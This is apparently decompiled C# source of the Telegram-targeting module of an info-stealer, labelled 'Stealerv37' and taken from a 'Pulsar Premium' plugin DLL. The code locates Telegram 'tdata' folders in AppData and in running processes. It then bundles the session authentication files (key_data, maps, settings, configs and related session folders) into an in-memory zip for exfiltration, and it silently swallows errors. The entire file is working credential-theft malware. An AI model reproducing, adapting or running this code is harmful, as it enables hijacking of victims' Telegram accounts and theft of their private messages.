// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Telegram
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Telegram : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Telegram);
    Parallel.ForEach<string>((IEnumerable<string>) this.FindAllMatches("tdata"), (Action<string>) (tdata =>
    {
      string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + RandomStrings.GenerateHashTag();
      this.Copydata(tdata, targetPath, zip, counterApplications);
    }));
    if (counterApplications.Files.Count <= 0)
      return;
    counter.Messangers.Add(counterApplications);
  }

  private void AddIfMatch(FileInfo fileInfo, string entryPath, InMemoryZip zip)
  {
    string name = fileInfo.Name;
    if (name.EndsWith("s") && name.Length == 17)
    {
      zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
    }
    else
    {
      if (!name.StartsWith("usertag") && !name.StartsWith("settings") && !name.StartsWith("key_data") && !name.StartsWith("configs") && !name.StartsWith("maps"))
        return;
      zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
    }
  }

  private void Copydata(
    string sourceDir,
    string targetPath,
    InMemoryZip zip,
    Counter.CounterApplications counterApplications)
  {
    ConcurrentBag<string> matchedNames = new ConcurrentBag<string>();
    bool addedAny = false;
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(sourceDir), (Action<string>) (filePath =>
    {
      try
      {
        FileInfo fileInfo = new FileInfo(filePath);
        if (fileInfo.Length > 7120L)
          return;
        string entryPath = $"{targetPath}\\{fileInfo.Name}";
        if (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17)
          matchedNames.Add(fileInfo.Name);
        int count = counterApplications.Files.Count;
        this.AddIfMatch(fileInfo, entryPath, zip);
        if ((!fileInfo.Name.EndsWith("s") || fileInfo.Name.Length != 17) && !fileInfo.Name.StartsWith("usertag") && !fileInfo.Name.StartsWith("settings") && !fileInfo.Name.StartsWith("key_data") && !fileInfo.Name.StartsWith("configs") && !fileInfo.Name.StartsWith("maps"))
          return;
        addedAny = true;
      }
      catch
      {
      }
    }));
    Parallel.ForEach<string>((IEnumerable<string>) matchedNames, (Action<string>) (name =>
    {
      try
      {
        string dirPath = Path.Combine(sourceDir, name);
        dirPath = dirPath.Remove(dirPath.Length - 1);
        if (!Directory.Exists(dirPath))
          return;
        Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(dirPath), (Action<string>) (filePath =>
        {
          try
          {
            FileInfo fileInfo = new FileInfo(filePath);
            if (fileInfo.Length > 7120L)
              return;
            string entryPath = $"{targetPath}\\{Path.GetFileName(dirPath)}\\{fileInfo.Name}";
            this.AddIfMatch(fileInfo, entryPath, zip);
            if ((!fileInfo.Name.EndsWith("s") || fileInfo.Name.Length != 17) && !fileInfo.Name.StartsWith("usertag") && !fileInfo.Name.StartsWith("settings") && !fileInfo.Name.StartsWith("key_data") && !fileInfo.Name.StartsWith("configs") && !fileInfo.Name.StartsWith("maps"))
              return;
            addedAny = true;
          }
          catch
          {
          }
        }));
      }
      catch
      {
      }
    }));
    if (!addedAny)
      return;
    counterApplications.Files.Add($"{sourceDir} => {targetPath}");
  }

  private List<string> FindInAppData(string folderName)
  {
    if (string.IsNullOrEmpty(folderName))
      return new List<string>();
    ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    string[] strArray = new string[2]
    {
      Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
      Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    };
    foreach (string path1 in strArray)
    {
      if (!string.IsNullOrEmpty(path1))
      {
        if (Directory.Exists(path1))
        {
          try
          {
            Parallel.ForEach<string>(Directory.EnumerateDirectories(path1, "*", SearchOption.TopDirectoryOnly), (Action<string>) (dir1 =>
            {
              try
              {
                string path2 = Path.Combine(dir1, folderName);
                if (!Directory.Exists(path2))
                  return;
                found.TryAdd(Path.GetFullPath(path2), (byte) 0);
              }
              catch
              {
              }
            }));
          }
          catch
          {
          }
        }
      }
    }
    return new List<string>((IEnumerable<string>) found.Keys);
  }

  private List<string> FindAllMatches(string folderName)
  {
    ConcurrentDictionary<string, byte> set = new ConcurrentDictionary<string, byte>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    Parallel.ForEach<string>((IEnumerable<string>) ProcessWindows.FindFolder(folderName), (Action<string>) (p => set.TryAdd(p, (byte) 0)));
    Parallel.ForEach<string>((IEnumerable<string>) this.FindInAppData(folderName), (Action<string>) (p => set.TryAdd(p, (byte) 0)));
    return new List<string>((IEnumerable<string>) set.Keys);
  }
}
